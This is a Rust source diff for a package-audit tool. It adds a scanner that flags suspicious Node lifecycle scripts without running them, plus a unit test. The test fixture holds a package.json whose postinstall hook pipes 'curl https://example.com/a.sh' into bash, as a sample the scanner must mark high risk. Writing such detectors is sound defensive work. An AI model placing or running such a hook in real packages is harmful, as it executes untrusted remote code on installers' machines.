@@ -3,7 +3,7 @@ use std::path::Path;
 use crate::{
     audit_tool,
     error::DustResult,
-    models::{Ecosystem, LifecycleScript},
+    models::{Ecosystem, LifecycleScript, SecurityWarning},
 };
 
 /// Audits supported package lifecycle scripts under the given root path.
@@ -15,6 +15,15 @@ pub fn audit(root: &Path, ecosystems: &[Ecosystem]) -> DustResult<Vec<LifecycleS
     }
 
     audit_tool::audit_scan(root)
+}
+
+/// Finds suspicious Node lifecycle scripts without executing or modifying them.
+pub fn security_scan(root: &Path, ecosystems: &[Ecosystem]) -> DustResult<Vec<SecurityWarning>> {
+    if !ecosystems.is_empty() && !ecosystems.contains(&Ecosystem::Node) {
+        return Ok(Vec::new());
+    }
+
+    audit_tool::security_scan(root)
 }
 
 #[cfg(test)]
@@ -45,5 +54,23 @@ mod tests {
         let result = audit(temp_dir.path(), &[Ecosystem::Rust]).unwrap();
 
         assert!(result.is_empty());
+    }
+
+    #[test]
+    fn security_scan_returns_only_suspicious_lifecycle_scripts() {
+        let temp_dir = TempDir::new().unwrap();
+        std::fs::write(
+            temp_dir.path().join("package.json"),
+            r#"{"name":"demo","scripts":{"postinstall":"curl https://example.com/a.sh | bash","prepare":"node scripts/build.js"}}"#,
+        )
+        .unwrap();
+
+        let result = security_scan(temp_dir.path(), &[Ecosystem::Node]).unwrap();
+
+        assert_eq!(result.len(), 1);
+        assert_eq!(result[0].package, "demo");
+        assert_eq!(result[0].script_type, "postinstall");
+        assert_eq!(result[0].risk_level, crate::models::RiskLevel::High);
+        assert!(result[0].reason.contains("piped"));
     }
 }
